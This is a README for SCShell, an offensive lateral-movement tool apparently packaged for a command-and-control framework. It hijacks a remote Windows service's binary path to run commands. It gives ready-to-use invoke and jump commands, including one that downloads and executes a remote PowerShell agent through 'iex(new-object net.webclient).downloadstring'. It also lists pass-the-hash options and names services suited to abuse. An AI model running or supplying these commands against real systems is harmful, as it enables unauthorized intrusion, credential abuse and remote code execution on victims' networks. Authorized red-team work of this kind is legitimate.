# SCShell - Service Control Shell

SCShell is a lateral movement technique that modifies an existing service's binary path to execute arbitrary commands or spawn sessions on remote systems.


## Description
SCShell works by:
1. Connecting to the Service Control Manager (SCM) on a remote system
2. Opening an existing service
3. Saving the original binary path
4. Modifying the service binary path to point to your payload
5. Starting the service (which executes your payload)
6. Restoring the original binary path

## Usage

### Fileless Command Execution (Invoke)
Execute commands on remote systems by temporarily modifying a service:

```
invoke scshell <target> <service_name> <command>
```
Recommend using `cmd /c` to make sure the payload will not be killed once the service stops.

If something isn't working, try using full paths in your command.

Example:
```
invoke scshell 10.0.2.10 defragsvc "cmd.exe /c \\10.0.2.1\share\agent.exe"
invoke scshell 10.0.2.10 defragsvc "cmd.exe /c powershell -c \"$r=whoami;$r > C:\Temp\whoami.txt\""
```

With impersonation (for pass-the-hash scenarios):
```
invoke scshell -i 10.0.2.10 defragsvc "cmd.exe /c powershell -c iex(new-object net.webclient).downloadstring('http://server/agent.ps1')"
```

### Lateral Movement (Jump)

**Note:** Jumping with SCShell requires deploying a service binary to the target system, similar to psexec. It will no longer be fileless like invoke.

Deploy an agent to a remote system:

```
jump scshell <target> <svc_binary_path> [-n service_name] [-b binary_name] [-s share] [-p path]
```

Example:
```
jump scshell 10.0.2.10 /tmp/agent_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
```

## Parameters

### Invoke SCShell
- `target`: Target hostname or IP address
- `service`: Service name to modify (e.g., defragsvc, spooler, etc.)
- `payload`: Command or binary path to execute
- `-i`: Use impersonation for authentication (pass-the-hash)

### Jump SCShell
- `target`: Target hostname or IP address
- `binary`: Local path to the agent binary
- `-n service_name`: Service to modify (default: defragsvc)
- `-b binary_name`: Remote binary name (default: random)
- `-s share`: Share for file copy (default: ADMIN$)
- `-p svc_path`: Path to the service file (default: C:\Windows)

## Suitable Services
Common services that work well with SCShell:
- `defragsvc` - Disk Defragmentation Service
- `spooler` - Print Spooler
- `SensorService` - Server to manage sensors.
- `SessionEnv` - Remote Desktop Configuration
- `IKEEXT` - IKE and AuthIP IPsec Keying Modules

Choose services that:
- Are not critical to system operation
- Are not running (or can be stopped)
- Have sufficient privileges
- Are configured to start on-demand

## Requirements
- Administrative privileges on the remote system
- Network access to the target (SMB/RPC ports)
- Appropriate credentials (or impersonated token)

## Compiled Binaries
- `scshell.x64.o` - Standard version
- `scshell_imp.x64.o` - Impersonation version (for pass-the-hash)

## Credits
Original Author: Mr.Un1k0d3r RingZer0 Team


https://github.com/Mr-Un1k0d3r/SCShell
